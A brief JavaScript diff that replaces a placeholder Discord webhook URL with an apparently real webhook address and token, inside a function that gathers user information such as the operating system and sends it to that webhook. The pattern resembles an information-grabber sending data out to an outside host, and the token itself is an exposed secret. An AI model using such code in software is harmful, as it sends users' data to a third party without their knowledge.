@@ -1,5 +1,5 @@
 function sendUserInformationToWebhook() {
-    const webhookURL = 'https://discord.com/api/webhooks/your_webhook_url_here'; // Replace with your actual Discord webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1132417097809530931/tQ2gb2A2Gt7ZmKM2x3UTp2tWgnq922cdDU0FhX9CE4DeooHoiYuhTH0W9GsnVJGh_L9j'; // Replace with your actual Discord webhook URL
 
     // Get user information
     const os = getOperatingSystem();
